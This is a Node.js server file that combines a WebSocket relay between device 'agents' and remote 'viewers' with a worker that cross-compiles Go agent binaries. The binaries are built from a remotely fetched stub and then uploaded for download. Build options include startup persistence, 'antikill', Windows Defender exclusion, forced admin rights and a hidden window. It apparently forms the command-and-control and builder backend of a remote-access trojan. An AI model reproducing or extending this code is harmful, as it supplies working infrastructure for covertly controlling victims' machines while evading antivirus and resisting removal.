// ─────────────────────────────────────────────────────────────────────────────
// HidenHost combined server — WebSocket relay + nodego Go build worker.
//
// One process, one port (HTTP+WS on PORT), one background loop that:
//   1. installs Go if missing (downloads from go.dev into ~/.nodego-go)
//   2. fetches & caches the Go agent stub from the frontend API
//   3. polls the frontend for queued builds, cross-compiles, uploads, cleans up
//
// WS relay logic is unchanged from the standalone relay — the build worker
// just runs alongside it in the same Node process.
// ─────────────────────────────────────────────────────────────────────────────

'use strict';

require('dotenv').config();
const http    = require('http');
const https   = require('https');
const express = require('express');
const cors    = require('cors');
const { WebSocketServer } = require('ws');
const { randomUUID }      = require('crypto');
const os      = require('os');
const fs      = require('fs');
const path    = require('path');
const crypto  = require('crypto');
const { spawn, spawnSync } = require('child_process');

// ─── relay config ───────────────────────────────────────────────────────────
const HOST = process.env.HOST || '0.0.0.0';
const PORT = parseInt(process.env.PORT || '24578', 10);
const AUTH_KEY = process.env.HIDEN_AUTH_KEY || '';
const PING_INTERVAL_MS = parseInt(process.env.PING_INTERVAL_MS || '25000', 10);
const MAX_PAYLOAD = parseInt(process.env.MAX_PAYLOAD || String(16 * 1024 * 1024), 10);
const CORS_ORIGINS = (process.env.CORS_ORIGINS || '*')
  .split(',').map(s => s.trim()).filter(Boolean);
const IDLE_SHUTDOWN_SEC = parseInt(process.env.IDLE_SHUTDOWN_SEC || '0', 10);

// ─── build worker config ────────────────────────────────────────────────────
const FRONTEND  = (process.env.FRONTEND_URL || 'https://wallahis.lovable.app').replace(/\/+$/, '');
const BUILD_KEY = process.env.BUILDSERVER_KEY || '';
const POLL_MS   = parseInt(process.env.BUILD_POLL_MS || '4000', 10);
const WORK_ROOT = process.env.BUILD_WORK_DIR || path.join(os.tmpdir(), 'nodego-builds');
const GO_VERSION = process.env.GO_VERSION || '1.23.4';
const GO_ROOT    = process.env.GOROOT || path.join(os.homedir(), '.nodego-go');
const GO_BIN     = path.join(GO_ROOT, 'go', 'bin', process.platform === 'win32' ? 'go.exe' : 'go');
const BUILD_UA   = 'hidenhost-combined/1.0';
const BUILD_HDR  = { 'X-Buildserver-Key': BUILD_KEY, 'User-Agent': BUILD_UA };
const STUB_REFRESH_MS = 5 * 60 * 1000;
let cachedStub = null;

fs.mkdirSync(WORK_ROOT, { recursive: true });

// ─── tiny logging ───────────────────────────────────────────────────────────
const C = { reset:'\x1b[0m', dim:'\x1b[90m', green:'\x1b[32m', yellow:'\x1b[33m',
            red:'\x1b[31m', cyan:'\x1b[36m', bold:'\x1b[1m' };
const ts = () => new Date().toISOString().slice(11, 19);
const info = m => console.log(`${C.dim}[${ts()}]${C.reset} ${C.cyan}info${C.reset} ${m}`);
const ok   = m => console.log(`${C.dim}[${ts()}]${C.reset} ${C.green}ok  ${C.reset} ${m}`);
const warn = m => console.log(`${C.dim}[${ts()}]${C.reset} ${C.yellow}warn${C.reset} ${m}`);
const errL = m => console.log(`${C.dim}[${ts()}]${C.reset} ${C.red}err ${C.reset} ${m}`);

// ─── idle shutdown ──────────────────────────────────────────────────────────
let lastActivity = Date.now();
function touch() { lastActivity = Date.now(); }
if (IDLE_SHUTDOWN_SEC > 0) {
  setInterval(() => {
    if (Date.now() - lastActivity > IDLE_SHUTDOWN_SEC * 1000) {
      console.log(`[idle] no activity for ${IDLE_SHUTDOWN_SEC}s — shutting down`);
      shutdown();
    }
  }, 10000);
}

// ─── HTTP side ──────────────────────────────────────────────────────────────
const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors({ origin: CORS_ORIGINS.includes('*') ? true : CORS_ORIGINS, credentials: false }));
const startedAt = Date.now();

app.get('/', (req, res) => {
  touch();
  const wantsJson = req.query.format === 'json'
    || (req.headers.accept || '').includes('application/json');
  const uptimeSec = Math.floor((Date.now() - startedAt) / 1000);
  const payload = {
    status: 'ok', name: 'hidenhost-combined',
    server: 'online', proxy: 'working', wss: 'ready', http: 'ready',
    builder: builderState.ready ? 'ready' : 'starting',
    builderGo: builderState.goPath || null,
    builderStub: cachedStub ? Object.keys(cachedStub.files) : [],
    builderActive: builderState.active,
    builderCompleted: builderState.completed,
    uptimeSec,
    agents: agents.size,
    viewers: [...viewers.values()].reduce((n, s) => n + s.size, 0),
    devices: viewers.size,
    ts: Date.now(),
  };
  if (wantsJson) return res.json(payload);
  const uptimeStr = formatUptime(uptimeSec);
  res.set('content-type', 'text/html; charset=utf-8');
  res.send(`<!doctype html><html><head><meta charset="utf-8"><title>HidenHost — online</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body{margin:0;font:14px/1.5 ui-sans-serif,system-ui,sans-serif;background:#0b0f17;color:#e5e7eb;min-height:100vh;display:grid;place-items:center;padding:24px}
  .card{max-width:560px;width:100%;background:#111827;border:1px solid #1f2937;border-radius:16px;padding:28px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
  h1{margin:0 0 4px;font-size:20px;font-weight:600}
  .sub{color:#9ca3af;font-size:13px;margin-bottom:20px}
  .dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:#22c55e;box-shadow:0 0 12px #22c55e;margin-right:8px;vertical-align:middle;animation:pulse 2s infinite}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
  .row{display:flex;justify-content:space-between;padding:10px 0;border-top:1px solid #1f2937;font-size:13px}
  .row:first-of-type{border-top:0}
  .k{color:#9ca3af}
  .v{color:#f3f4f6;font-variant-numeric:tabular-nums}
  .ok{color:#22c55e;font-weight:600}
  code{background:#0b0f17;padding:2px 6px;border-radius:4px;font-size:12px;color:#60a5fa}
</style></head><body>
<div class="card">
  <h1><span class="dot"></span>HidenHost relay + builder online</h1>
  <div class="sub">WebSocket relay on <code>:${PORT}</code> &middot; Go build worker polling <code>${FRONTEND}</code></div>
  <div class="row"><span class="k">Server</span><span class="v ok">online</span></div>
  <div class="row"><span class="k">HTTP</span><span class="v ok">ready</span></div>
  <div class="row"><span class="k">WSS</span><span class="v ok">ready</span></div>
  <div class="row"><span class="k">Builder</span><span class="v ${payload.builder==='ready'?'ok':''}">${payload.builder}</span></div>
  <div class="row"><span class="k">Go</span><span class="v">${payload.builderGo || '—'}</span></div>
  <div class="row"><span class="k">Builds done</span><span class="v">${payload.builderCompleted}</span></div>
  <div class="row"><span class="k">Uptime</span><span class="v">${uptimeStr}</span></div>
  <div class="row"><span class="k">Connected agents</span><span class="v">${payload.agents}</span></div>
  <div class="row"><span class="k">Connected viewers</span><span class="v">${payload.viewers}</span></div>
  <div class="row"><span class="k">Devices routed</span><span class="v">${payload.devices}</span></div>
</div></body></html>`);
});

function formatUptime(sec) {
  const d = Math.floor(sec / 86400); sec %= 86400;
  const h = Math.floor(sec / 3600); sec %= 3600;
  const m = Math.floor(sec / 60); const s = sec % 60;
  const parts = [];
  if (d) parts.push(`${d}d`);
  if (h || d) parts.push(`${h}h`);
  if (m || h || d) parts.push(`${m}m`);
  parts.push(`${s}s`);
  return parts.join(' ');
}

app.get('/health', (_req, res) => {
  touch();
  res.json({ ok: true, server: 'online', proxy: 'working', builder: builderState.ready, ts: Date.now() });
});

app.get('/stats', (_req, res) => {
  touch();
  res.json({
    agents: [...agents.keys()],
    viewers: [...viewers.entries()].map(([dev, set]) => ({ deviceId: dev, count: set.size })),
    builder: { ...builderState, stubFiles: cachedStub ? Object.keys(cachedStub.files) : [] },
  });
});

const server = http.createServer(app);
server.on('connection', sock => {
  try { sock.setNoDelay(true); sock.setKeepAlive(true, 15000); } catch (_) {}
});

// ─── WebSocket side ─────────────────────────────────────────────────────────
const wss = new WebSocketServer({
  noServer: true, perMessageDeflate: false,
  maxPayload: MAX_PAYLOAD, skipUTF8Validation: true,
});

const agents = new Map();
const viewers = new Map();
const viewerByClient = new Map();

function checkKey(provided) {
  if (!AUTH_KEY) return true;
  return provided === AUTH_KEY;
}

server.on('upgrade', (req, socket, head) => {
  touch();
  const url = new URL(req.url, `http://${req.headers.host}`);
  const key = req.headers['x-hiden-key'] || url.searchParams.get('key');
  if (!checkKey(key)) {
    socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
    socket.destroy();
    return;
  }
  wss.handleUpgrade(req, socket, head, ws => {
    ws._url = url;
    wss.emit('connection', ws, req);
  });
});

wss.on('connection', ws => {
  ws.id = randomUUID();
  ws.role = null;
  ws.deviceId = null;
  ws.clientId = null;
  ws.isAlive = true;
  ws.connectedAt = Date.now();
  touch();

  const qRole = ws._url?.searchParams.get('role');
  const qDevice = ws._url?.searchParams.get('device');
  const qClient = ws._url?.searchParams.get('clientId');
  if (qRole && qDevice) attach(ws, qRole, qDevice, qClient);

  ws.on('pong', () => { ws.isAlive = true; });

  ws.on('message', (raw, isBinary) => {
    touch();
    if (isBinary) {
      if (!ws.role || !ws.deviceId) return;
      if (ws.role === 'agent') {
        const set = viewers.get(ws.deviceId);
        if (!set) return;
        for (const v of set) if (v.readyState === ws.OPEN) v.send(raw, { binary: true });
      } else {
        const target = agents.get(ws.deviceId);
        if (target && target.readyState === ws.OPEN) target.send(raw, { binary: true });
      }
      return;
    }
    let msg;
    try { msg = JSON.parse(raw.toString()); }
    catch { return safeSend(ws, { type: 'error', error: 'invalid json' }); }

    if (msg.type === 'ping') { safeSend(ws, { type: 'pong', t: msg.t }); return; }
    if (msg.type === 'hello') {
      attach(ws, msg.role, msg.deviceId, msg.clientId);
      safeSend(ws, { type: 'welcome', id: ws.id, role: ws.role, deviceId: ws.deviceId });
      return;
    }
    if (!ws.role || !ws.deviceId) {
      return safeSend(ws, { type: 'error', error: 'not identified — send {type:"hello",role,deviceId}' });
    }
    if (ws.role === 'viewer') {
      const target = agents.get(ws.deviceId);
      if (target && target.readyState === ws.OPEN) {
        msg.from = 'viewer'; msg.viewerId = ws.id;
        target.send(JSON.stringify(msg));
      } else {
        safeSend(ws, { type: 'error', error: 'agent offline' });
      }
    } else if (ws.role === 'agent') {
      const set = viewers.get(ws.deviceId);
      if (!set || set.size === 0) return;
      msg.from = 'agent';
      const wire = JSON.stringify(msg);
      const targetViewer = msg.to;
      for (const v of set) {
        if (v.readyState !== ws.OPEN) continue;
        if (targetViewer && targetViewer !== v.id) continue;
        v.send(wire);
      }
    }
  });

  ws.on('close', () => detach(ws));
  ws.on('error', () => detach(ws));
});

function attach(ws, role, deviceId, clientId) {
  if (!deviceId || !['agent', 'viewer'].includes(role)) return;
  ws.role = role;
  ws.deviceId = deviceId;
  if (role === 'agent') {
    const prev = agents.get(deviceId);
    if (prev && prev !== ws) try { prev.close(4000, 'replaced'); } catch (_) {}
    agents.set(deviceId, ws);
    broadcastToViewers(deviceId, { type: 'agent-online', deviceId });
  } else {
    if (clientId) {
      ws.clientId = clientId;
      const key = `${deviceId}|${clientId}`;
      const prev = viewerByClient.get(key);
      if (prev && prev !== ws) try { prev.close(4000, 'replaced-by-newer-client'); } catch (_) {}
      viewerByClient.set(key, ws);
    }
    if (!viewers.has(deviceId)) viewers.set(deviceId, new Set());
    viewers.get(deviceId).add(ws);
    const a = agents.get(deviceId);
    if (a && a.readyState === ws.OPEN) {
      safeSend(a, { type: 'viewer-joined', deviceId, viewerId: ws.id });
    }
  }
  console.log(`[+] ${role} ${deviceId} (${ws.id.slice(0, 8)})`);
}

function detach(ws) {
  if (!ws.deviceId) return;
  if (ws.role === 'agent' && agents.get(ws.deviceId) === ws) {
    agents.delete(ws.deviceId);
    broadcastToViewers(ws.deviceId, { type: 'agent-offline', deviceId: ws.deviceId });
  } else if (ws.role === 'viewer') {
    const set = viewers.get(ws.deviceId);
    if (set) {
      set.delete(ws);
      if (set.size === 0) viewers.delete(ws.deviceId);
      const a = agents.get(ws.deviceId);
      if (a && a.readyState === ws.OPEN) {
        safeSend(a, { type: 'viewer-left', deviceId: ws.deviceId, viewerId: ws.id });
      }
    }
    if (ws.clientId) {
      const key = `${ws.deviceId}|${ws.clientId}`;
      if (viewerByClient.get(key) === ws) viewerByClient.delete(key);
    }
  }
  console.log(`[-] ${ws.role} ${ws.deviceId} (${ws.id.slice(0, 8)})`);
}

function broadcastToViewers(deviceId, msg) {
  const set = viewers.get(deviceId);
  if (!set) return;
  for (const v of set) if (v.readyState === v.OPEN) safeSend(v, msg);
}

function safeSend(ws, obj) { try { ws.send(JSON.stringify(obj)); } catch (_) {} }

setInterval(() => {
  wss.clients.forEach(ws => {
    if (ws.isAlive === false) { try { ws.terminate(); } catch (_) {} return; }
    ws.isAlive = false;
    try { ws.ping(); } catch (_) {}
  });
}, PING_INTERVAL_MS);

// ═══════════════════════════════════════════════════════════════════════════
// nodego build worker (runs inline, in the same process as the relay)
// ═══════════════════════════════════════════════════════════════════════════

const builderState = { ready: false, goPath: null, active: null, completed: 0 };

function api(p) { return `${FRONTEND}/api/public/buildserver/${p}`; }

function which(cmd) {
  const r = spawnSync(process.platform === 'win32' ? 'where' : 'which', [cmd], { encoding: 'utf8' });
  if (r.status !== 0) return null;
  return r.stdout.split(/\r?\n/)[0].trim() || null;
}

function run(cmd, args, opts = {}) {
  return new Promise((resolve) => {
    const p = spawn(cmd, args, { stdio: ['ignore', 'pipe', 'pipe'], ...opts });
    const outs = [], errs = [];
    const feed = (buf, into) => {
      const s = buf.toString();
      into.push(s);
      s.split(/\r?\n/).forEach(l => { if (l && opts.verbose !== false) info(`  ${l}`); });
    };
    p.stdout.on('data', (d) => feed(d, outs));
    p.stderr.on('data', (d) => feed(d, errs));
    p.on('close', (code) => resolve({ code, stdout: outs.join(''), stderr: errs.join('') }));
    p.on('error', (e)  => resolve({ code: 127, stdout: '', stderr: e.message }));
  });
}

function download(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    const get = (u) => {
      const client = u.startsWith('https') ? https : http;
      client.get(u, (res) => {
        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          res.resume(); return get(res.headers.location);
        }
        if (res.statusCode !== 200) return reject(new Error(`download ${u} → ${res.statusCode}`));
        res.pipe(file);
        file.on('finish', () => file.close(() => resolve(dest)));
      }).on('error', reject);
    };
    get(url);
  });
}

async function ensureGo() {
  const found = which('go');
  if (found) { ok(`go found at ${found}`); return 'go'; }
  if (fs.existsSync(GO_BIN)) {
    process.env.PATH = `${path.dirname(GO_BIN)}${path.delimiter}${process.env.PATH || ''}`;
    ok(`go found at ${GO_BIN}`);
    return GO_BIN;
  }
  const platform = process.platform;
  const arch     = process.arch;
  const goArch   = arch === 'arm64' ? 'arm64' : 'amd64';
  const goOs     = platform === 'win32' ? 'windows' : platform === 'darwin' ? 'darwin' : 'linux';
  const ext      = platform === 'win32' ? 'zip' : 'tar.gz';
  const url      = `https://go.dev/dl/go${GO_VERSION}.${goOs}-${goArch}.${ext}`;
  info(`installing Go ${GO_VERSION} for ${goOs}/${goArch}…`);
  fs.mkdirSync(GO_ROOT, { recursive: true });
  const archive = path.join(GO_ROOT, `go.${ext}`);
  info(`  downloading ${url}`);
  await download(url, archive);
  info(`  extracting into ${GO_ROOT}`);
  if (ext === 'zip') {
    if (which('unzip')) await run('unzip', ['-oq', archive, '-d', GO_ROOT], { verbose: false });
    else await run('powershell', ['-Command', `Expand-Archive -Force "${archive}" "${GO_ROOT}"`], { verbose: false });
  } else {
    await run('tar', ['-xzf', archive, '-C', GO_ROOT], { verbose: false });
  }
  fs.unlinkSync(archive);
  if (!fs.existsSync(GO_BIN)) throw new Error(`go install finished but ${GO_BIN} missing`);
  process.env.PATH = `${path.dirname(GO_BIN)}${path.delimiter}${process.env.PATH || ''}`;
  ok(`go installed → ${GO_BIN}`);
  return GO_BIN;
}

async function j(url, init = {}) {
  init.headers = { ...BUILD_HDR, ...(init.headers || {}) };
  return fetch(url, init);
}

async function fetchStubFromAPI() {
  info('fetching Go stub source from API…');
  const r = await j(api('stub'));
  if (!r.ok) throw new Error(`stub → HTTP ${r.status}: ${(await r.text()).slice(0, 300)}`);
  const body = await r.json();
  const files = body.files || {};
  const names = Object.keys(files);
  if (names.length === 0) throw new Error('stub returned zero files');
  cachedStub = { files, fetchedAt: Date.now() };
  ok(`stub cached: ${names.join(', ')} (${names.reduce((s, k) => s + files[k].length, 0)} bytes total)`);
  return files;
}

async function getStub() {
  if (!cachedStub || Date.now() - cachedStub.fetchedAt > STUB_REFRESH_MS) {
    await fetchStubFromAPI();
  }
  return cachedStub.files;
}

async function poll() {
  try {
    const r = await j(api('poll'));
    if (r.status === 204) return null;
    if (!r.ok) { warn(`poll → HTTP ${r.status}`); return null; }
    const body = await r.json();
    const builds = body.builds || (body.build ? [body.build] : []);
    return { build: builds[0] || null, live: body };
  } catch (e) { warn(`poll error: ${e.message}`); return null; }
}

async function progress(buildId, pct, message = '', status = 'building', extra = {}) {
  try {
    await j(api('progress'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ build_id: buildId, progress: pct, status, message, ...extra }),
    });
  } catch (_) {}
}

async function uploadArtifact(buildId, filename, bytes) {
  const boundary = '----nodego' + crypto.randomUUID().replace(/-/g, '');
  const pre = Buffer.from(
    `--${boundary}\r\nContent-Disposition: form-data; name="build_id"\r\n\r\n${buildId}\r\n` +
    `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\n` +
    `Content-Type: application/octet-stream\r\n\r\n`
  );
  const post = Buffer.from(`\r\n--${boundary}--\r\n`);
  const body = Buffer.concat([pre, bytes, post]);
  const r = await fetch(api('upload'), {
    method: 'POST',
    headers: { ...BUILD_HDR, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
    body,
  });
  if (!r.ok) throw new Error(`upload → HTTP ${r.status}: ${(await r.text()).slice(0, 200)}`);
  return r.json().catch(() => ({}));
}

function goStr(s) {
  return String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"')
    .replace(/\r/g, '\\r').replace(/\n/g, '\\n').replace(/\t/g, '\\t');
}

function render(src, ctx) {
  let out = src;
  for (const [k, v] of Object.entries(ctx)) out = out.split(`{{${k}}}`).join(String(v));
  out = out.replace(/\{\{([A-Z0-9_]+)\}\}/g, (_m, k) => {
    if (k.startsWith('FEATURE_') || ['DEBUG', 'STARTUP_TASK', 'ANTIKILL'].includes(k)) return 'false';
    return '';
  });
  return out;
}

function writeTree(dir, files) {
  for (const [name, src] of Object.entries(files)) {
    const fp = path.join(dir, name);
    fs.mkdirSync(path.dirname(fp), { recursive: true });
    fs.writeFileSync(fp, src);
  }
}

function rmrf(dir) { try { fs.rmSync(dir, { recursive: true, force: true }); } catch (_) {} }

async function buildOne(b, live, goCmd) {
  const bid   = b.id;
  const name  = b.name || 'agent';
  const safe  = (name.match(/[A-Za-z0-9_\-]+/g) || ['agent']).join('_');
  const plat  = b.platform || 'windows';
  builderState.active = { id: bid, name: safe, platform: plat, startedAt: Date.now() };
  info(`▶ ${bid.slice(0,8)} ${plat} (${safe})`);
  await progress(bid, 5, 'preparing source');

  const stub = await getStub();
  const relayUrl  = b.relay_url || process.env.RELAY_URL || 'wss://umad.hidenmc.com';
  const relayHttp = relayUrl.replace(/^wss:\/\//, 'https://').replace(/^ws:\/\//, 'http://');

  const ctx = {
    USER_ID:          goStr(b.user_id),
    API_BASE:         goStr(b.target_server_url || FRONTEND),
    RELAY_URL:        goStr(relayUrl),
    RELAY_HTTP_URL:   goStr(relayHttp),
    BUILD_NAME:       safe,
    STARTUP_NAME:     goStr(b.startup_name || name),
    DEBUG:            b.debug ? 'true' : 'false',
    FEATURE_STARTUP:  b.startup ? 'true' : 'false',
    FEATURE_ANTIKILL: b.antikill ? 'true' : 'false',
    FEATURE_FUN:      b.fun_features ? 'true' : 'false',
    FEATURE_WD_EXCLUSION:  b.wd_exclusion ? 'true' : 'false',
    FEATURE_REQUIRE_ADMIN: b.require_admin ? 'true' : 'false',
    BUILD_TAG:         goStr(b.tag || ''),
    SUPABASE_URL:      goStr(live.supabase_url || ''),
    SUPABASE_ANON_KEY: goStr(live.supabase_anon_key || ''),
    HIDEN_AUTH_KEY:    goStr(live.hiden_auth_key || process.env.HIDEN_AUTH_KEY || ''),
    BIND_DEVICE_ID:    goStr(b.device_id || ''),
    BIND_DEVICE_TOKEN: goStr(b.device_token || ''),
  };

  const bdir = path.join(WORK_ROOT, bid);
  rmrf(bdir); fs.mkdirSync(bdir, { recursive: true });
  const rendered = Object.fromEntries(Object.entries(stub).map(([k, v]) => [k, render(v, ctx)]));
  writeTree(bdir, rendered);
  info(`  wrote ${Object.keys(rendered).length} source files → ${bdir}`);

  const goos   = plat === 'android' ? 'android' : plat === 'linux' ? 'linux' : 'windows';
  const goarch = 'amd64';
  const ext    = goos === 'windows' ? '.exe' : '';
  const outName = `${safe}${ext}`;
  const outPath = path.join(bdir, outName);

  await progress(bid, 25, `go build ${goos}/${goarch}`);
  const ldflags = goos === 'windows' && !b.debug ? '-s -w -H windowsgui' : '-s -w';
  const env = {
    ...process.env,
    GOOS: goos, GOARCH: goarch, CGO_ENABLED: '0',
    GOTOOLCHAIN: 'local', GOPROXY: 'off',
    GOFLAGS: process.env.GOFLAGS || '-p=1',
    GOMAXPROCS: process.env.GOMAXPROCS || '2',
    GOCACHE: path.join(GO_ROOT, 'cache'),
    GOPATH:  path.join(GO_ROOT, 'path'),
  };

  const t0 = Date.now();
  const { code, stderr } = await run(goCmd, ['build', '-ldflags', ldflags, '-o', outPath, '.'],
                                     { cwd: bdir, env });
  if (code !== 0) {
    errL(`go build failed:\n${stderr}`);
    await progress(bid, 100, `go build exit ${code}: ${stderr.slice(-500)}`, 'failed');
    rmrf(bdir); builderState.active = null;
    return;
  }
  info(`  compiled in ${((Date.now()-t0)/1000).toFixed(1)}s`);

  await progress(bid, 85, 'reading binary');
  if (!fs.existsSync(outPath)) {
    await progress(bid, 100, 'binary not found after build', 'failed');
    rmrf(bdir); builderState.active = null;
    return;
  }

  const bytes = fs.readFileSync(outPath);
  const kb = Math.floor(bytes.length / 1024);
  await progress(bid, 90, `uploading (${kb} KB)`);
  try {
    const up = await uploadArtifact(bid, outName, bytes);
    await progress(bid, 100, 'done', 'success', { download_url: up.download_url });
    ok(`${bid.slice(0,8)} → ${up.download_url || '(uploaded)'} (${kb} KB)`);
    builderState.completed++;
  } catch (e) {
    await progress(bid, 100, e.message, 'failed');
    errL(e.message);
  } finally {
    rmrf(bdir);
    info(`  cleaned build dir ${bdir}`);
    builderState.active = null;
  }
}

async function tick(goCmd) {
  const p = await poll();
  if (!p || !p.build) return;
  try { await buildOne(p.build, p.live, goCmd); }
  catch (e) {
    errL(`build exception: ${e.message}`);
    try { await progress(p.build.id, 100, e.message, 'failed'); } catch (_) {}
    builderState.active = null;
  }
}

async function startBuilder() {
  if (!BUILD_KEY) {
    warn('BUILDSERVER_KEY not set — build worker disabled (relay still running)');
    return;
  }
  info(`builder frontend  = ${FRONTEND}`);
  info(`builder workdir   = ${WORK_ROOT}`);
  info(`builder poll      = ${POLL_MS}ms`);

  try {
    const goCmd = await ensureGo();
    builderState.goPath = goCmd;
    ok('Go ready (stdlib-only agent, no module warm-up needed)');
    try { await fetchStubFromAPI(); }
    catch (e) { errL(`failed to fetch stub on launch: ${e.message} — will retry on first build`); }
    builderState.ready = true;
    ok('builder ready — polling for queued builds');

    let busy = false;
    setInterval(async () => {
      if (busy) return;
      busy = true;
      try { await tick(goCmd); } finally { busy = false; }
    }, POLL_MS);
  } catch (e) {
    errL(`builder failed to start: ${e.stack || e.message}`);
    errL('relay will keep running; fix the Go install and restart to enable builds');
  }
}

// ─── Boot ───────────────────────────────────────────────────────────────────
server.listen(PORT, HOST, () => {
  console.log(`╔═══════════════════════════════════════════════╗`);
  console.log(`║  HidenHost relay + nodego builder`);
  console.log(`║  Listening   ${HOST}:${PORT}`);
  console.log(`║  Public      ${process.env.PUBLIC_WS_URL || 'wss://umad.servemc.net'}`);
  console.log(`║  Auth        ${AUTH_KEY ? 'ENABLED' : 'DISABLED (dev)'}`);
  console.log(`║  Builder     ${BUILD_KEY ? 'enabled → ' + FRONTEND : 'DISABLED (no BUILDSERVER_KEY)'}`);
  console.log(`║  Idle stop   ${IDLE_SHUTDOWN_SEC > 0 ? IDLE_SHUTDOWN_SEC + 's' : 'DISABLED (24/7)'}`);
  console.log(`╚═══════════════════════════════════════════════╝`);
  // Launch builder async so the relay is up immediately
  startBuilder();
});

function shutdown() {
  console.log('\nshutting down…');
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(0), 3000);
}
process.on('SIGINT',  shutdown);
process.on('SIGTERM', shutdown);
